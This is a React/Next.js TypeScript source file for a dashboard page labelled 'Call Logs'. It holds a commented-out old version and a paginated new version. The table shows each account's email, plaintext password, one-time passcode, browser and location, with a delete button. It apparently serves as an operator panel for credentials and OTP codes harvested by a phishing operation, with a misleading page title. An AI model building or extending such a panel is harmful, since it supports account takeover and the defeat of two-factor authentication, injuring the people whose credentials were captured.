// "use client";
// import Seo from "@/shared/layout-components/seo/seo";
// import React, { Fragment, useEffect, useState } from "react";
// import { Button, Card, Col, Pagination, Row } from "react-bootstrap";
// import { deleteAccounts, getAccounts } from "@/shared/Api/dashboard";
// import { useDispatch, useSelector } from "react-redux";
// import { Trash2 } from "lucide-react";
// function CallLogsPage() {
//   const dispatch = useDispatch();
//   const user = useSelector((state: any) => state.auth.user);
//   const accounts = useSelector((state: any) => state.dash.accounts);
//   useEffect(() => {
//     getAccounts(user?._id, dispatch);
//   }, []);

//   const handleDeleteAccount = async (account: any) => {
//     deleteAccounts({ id: account?._id }, dispatch);
//   };
//   return (
//     <Fragment>
//       <Seo title={"Call-logs"} />
//       <Row>
//         <Col xl={12}>
//           <Card className="custom-card">
//             <Card.Header className="justify-content-between">
//               <Card.Title>Call Logs</Card.Title>
//               <div className="d-flex flex-wrap gap-2">
//                 <div>
//                   <input
//                     className="form-control form-control-sm"
//                     type="text"
//                     placeholder="Search Here"
//                     aria-label=".form-control-sm example"
//                   />
//                 </div>
//               </div>
//             </Card.Header>
//             <Card.Body className="p-0">
//               <div className="table-responsive">
//                 <table className="table text-nowrap">
//                   <thead>
//                     <tr>
//                       {/* <th scope="row" className="ps-4">
//                         <input
//                           className="form-check-input"
//                           type="checkbox"
//                           aria-label="..."
//                         />
//                       </th> */}
//                       <th>Email</th>
//                       <th>Password</th>
//                       <th>Otp</th>
//                       <th>Browser</th>
//                       <th>Country</th>
//                       <th>City</th>
//                       <th>State</th>
//                       <th>Action</th>
//                     </tr>
//                   </thead>
//                   <tbody>
//                     {accounts?.length && accounts?.map((account: any) => (
//                       <tr key={account._id}>
//                         {/* <td className="ps-4">
//                           <input
//                             className="form-check-input"
//                             type="checkbox"
//                             aria-label="..."
//                           />
//                         </td> */}
//                         <td>
//                           <div className="d-flex">
//                             <div className="ms-2">
//                               <p className="fs-12 text-muted mb-0">
//                                 {account.email}
//                               </p>
//                             </div>
//                           </div>
//                         </td>
//                         <td>{account.password}</td>
//                         <td>
//                           <span
//                             className={`badge bg-${account?.status?.toLowerCase()}-transparent`}
//                           >
//                             {account.otp}
//                           </span>
//                         </td>
//                         <td>
//                           <span className="fw-semibold fs-13">
//                             {"browser info"}
//                           </span>
//                           <span className="d-block text-muted fs-12">
//                             {account?.location?.country}
//                           </span>
//                         </td>
//                         <td>{account?.location?.country}</td>
//                         <td>{account?.location?.city}</td>
//                         <td>{account?.location?.region}</td>
//                         <td>
//                           <div className="btn-list">
//                             {/* <Button
//                               variant=""
//                               className="btn btn-sm btn-icon btn-primary-light btn-wave"
//                             >
//                               <i className="ri-eye-line"></i>
//                             </Button> */}
//                             <Button
//                               onClick={() => handleDeleteAccount(account)}
//                               variant=""
//                               className="btn btn-sm btn-icon text-red-500 btn-wave"
//                             >
//                               <Trash2 size={14} />
//                             </Button>
//                           </div>
//                         </td>
//                       </tr>
//                     ))}
//                   </tbody>
//                 </table>
//               </div>
//             </Card.Body>
//             <Card.Footer>
//               <div className="d-flex align-items-center">
//                 <div>
//                   {" "}
//                   Showing 6 Entries{" "}
//                   <i className="bi bi-arrow-right ms-2 fw-semibold"></i>{" "}
//                 </div>
//                 <div className="ms-auto">
//                   <nav
//                     aria-label="Page navigation"
//                     className="pagination-style-4"
//                   >
//                     <Pagination className="pagination mb-0">
//                       <Pagination.Item disabled> Prev </Pagination.Item>
//                       <Pagination.Item active>1</Pagination.Item>
//                       <Pagination.Item>2</Pagination.Item>
//                       <Pagination.Item className="pagination-next">
//                         next{" "}
//                       </Pagination.Item>
//                     </Pagination>
//                   </nav>
//                 </div>
//               </div>
//             </Card.Footer>
//           </Card>
//         </Col>
//       </Row>
//     </Fragment>
//   );
// }

// export default CallLogsPage;

"use client";
import Seo from "@/shared/layout-components/seo/seo";
import React, { Fragment, useEffect, useState } from "react";
import { Button, Card, Col, Pagination, Row } from "react-bootstrap";
import { deleteAccounts, getAccounts } from "@/shared/Api/dashboard";
import { useDispatch, useSelector } from "react-redux";
import { Trash2 } from "lucide-react";

function CallLogsPage() {
  const dispatch = useDispatch();
  const user = useSelector((state: any) => state.auth.user);
  const accounts = useSelector((state: any) => state.dash.accounts);

  const [currentPage, setCurrentPage] = useState(1); // Pagination: current page
  const [totalAccounts, setTotalAccounts] = useState(0); // Total accounts count
  const [limit] = useState(10); // Number of entries per page (can be adjusted)
  
  useEffect(() => {
    fetchAccounts(currentPage);
  }, [currentPage]);

  // Fetch accounts with pagination
  const fetchAccounts = async (page: number) => {
    const response = await getAccounts(user?._id, page, limit, dispatch);
    setTotalAccounts(response?.totalAccounts); // Set the total accounts count
  };

  const handleDeleteAccount = async (account: any) => {
    deleteAccounts({ id: account?._id }, dispatch);
    fetchAccounts(currentPage); // Refresh after deletion
  };

  // Handle page change
  const handlePageChange = (pageNumber: number) => {
    setCurrentPage(pageNumber);
  };

  const totalPages = Math.ceil(totalAccounts / limit);

  return (
    <Fragment>
      <Seo title={"Call-logs"} />
      <Row>
        <Col xl={12}>
          <Card className="custom-card">
            <Card.Header className="justify-content-between">
              <Card.Title>Call Logs</Card.Title>
              <div className="d-flex flex-wrap gap-2">
                <div>
                  <input
                    className="form-control form-control-sm"
                    type="text"
                    placeholder="Search Here"
                    aria-label=".form-control-sm example"
                  />
                </div>
              </div>
            </Card.Header>
            <Card.Body className="p-0">
              <div className="table-responsive">
                <table className="table text-nowrap">
                  <thead>
                    <tr>
                      <th>Email</th>
                      <th>Password</th>
                      <th>Otp</th>
                      <th>Browser</th>
                      <th>Country</th>
                      <th>City</th>
                      <th>State</th>
                      <th>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {accounts?.length > 0 &&
                      accounts.map((account: any) => (
                        <tr key={account._id}>
                          <td>
                            <div className="d-flex">
                              <div className="ms-2">
                                <p className="fs-12 text-muted mb-0">
                                  {account.email}
                                </p>
                              </div>
                            </div>
                          </td>
                          <td>{account.password}</td>
                          <td>
                            <span
                              className={`badge bg-${account?.status?.toLowerCase()}-transparent`}
                            >
                              {account.otp}
                            </span>
                          </td>
                          <td>
                            <span className="fw-semibold fs-13">
                              {"browser info"}
                            </span>
                            <span className="d-block text-muted fs-12">
                              {account?.location?.country}
                            </span>
                          </td>
                          <td>{account?.location?.country}</td>
                          <td>{account?.location?.city}</td>
                          <td>{account?.location?.region}</td>
                          <td>
                            <div className="btn-list">
                              <Button
                                onClick={() => handleDeleteAccount(account)}
                                variant=""
                                className="btn btn-sm btn-icon text-red-500 btn-wave"
                              >
                                <Trash2 size={14} />
                              </Button>
                            </div>
                          </td>
                        </tr>
                      ))}
                  </tbody>
                </table>
              </div>
            </Card.Body>
            <Card.Footer>
              <div className="d-flex align-items-center">
                <div>
                  Showing {accounts.length} Entries of {totalAccounts}{" "}
                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
                </div>
                <div className="ms-auto">
                  <nav
                    aria-label="Page navigation"
                    className="pagination-style-4"
                  >
                    <Pagination className="pagination mb-0">
                      <Pagination.Item
                        disabled={currentPage === 1}
                        onClick={() => handlePageChange(currentPage - 1)}
                      >
                        Prev
                      </Pagination.Item>
                      {[...Array(totalPages)].map((_, index) => (
                        <Pagination.Item
                          key={index}
                          active={index + 1 === currentPage}
                          onClick={() => handlePageChange(index + 1)}
                        >
                          {index + 1}
                        </Pagination.Item>
                      ))}
                      <Pagination.Item
                        disabled={currentPage === totalPages}
                        onClick={() => handlePageChange(currentPage + 1)}
                      >
                        Next
                      </Pagination.Item>
                    </Pagination>
                  </nav>
                </div>
              </div>
            </Card.Footer>
          </Card>
        </Col>
      </Row>
    </Fragment>
  );
}

export default CallLogsPage;
